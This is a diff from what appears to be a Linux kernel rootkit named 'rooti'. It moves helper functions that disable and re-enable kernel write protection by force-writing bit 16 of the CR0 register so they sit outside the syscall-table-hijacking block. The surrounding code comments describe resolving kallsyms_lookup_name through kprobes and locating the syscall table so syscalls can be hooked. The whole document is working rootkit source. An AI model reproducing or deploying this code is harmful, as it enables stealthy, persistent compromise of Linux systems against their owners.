@@ -53,6 +53,28 @@ void rooti_uninstall_hooks(struct rooti_syscall_hook *hooks, size_t count);
     .orig = (_orig)  \
 }
 
+/*
+    Custom utility function for writing intp the CR0 register. It is needed as the original function
+    from the linux headers prevents us from modifying the 16th bit of the register (in order to disable write protection).
+*/
+static inline void rooti_force_write_cr0(unsigned long val)
+{
+    unsigned long __force_order;
+    asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
+}
+
+/* Disable the write protcetion by clearing the 16th bit of the CR0 register */
+static inline void rooti_unprotect_memory(void)
+{
+    rooti_force_write_cr0(read_cr0() & (~0x10000));
+}
+
+/* Enable the write protection by setting the 16th bit of the CR0 register */
+static inline void rooti_protect_memory(void)
+{
+    rooti_force_write_cr0(read_cr0() | (0x10000));
+}
+
 /* 
     Since kernel version 5.7.7 - kallsyms_lookup_name() is no longer exported.
     We can work around this by probing the kallsyms_lookup_name() function with kernel probes.
@@ -94,28 +116,6 @@ static unsigned long rooti_resolve_syscall_handler_addr(struct rooti_syscall_hoo
 #if ROOTI_HOOKING_METHOD == ROOTI_METHOD_TABLE_HIJACKING
 
 unsigned long *__sys_call_table = NULL;
-
-/*
-    Custom utility function for writing intp the CR0 register. It is needed as the original function
-    from the linux headers prevents us from modifying the 16th bit of the register (in order to disable write protection).
-*/
-static inline void rooti_force_write_cr0(unsigned long val)
-{
-    unsigned long __force_order;
-    asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
-}
-
-/* Disable the write protcetion by clearing the 16th bit of the CR0 register */
-static inline void rooti_unprotect_memory(void)
-{
-    rooti_force_write_cr0(read_cr0() & (~0x10000));
-}
-
-/* Enable the write protection by setting the 16th bit of the CR0 register */
-static inline void rooti_protect_memory(void)
-{
-    rooti_force_write_cr0(read_cr0() | (0x10000));
-}
 
 /*
     Looks up the address of the kernel syscall table.
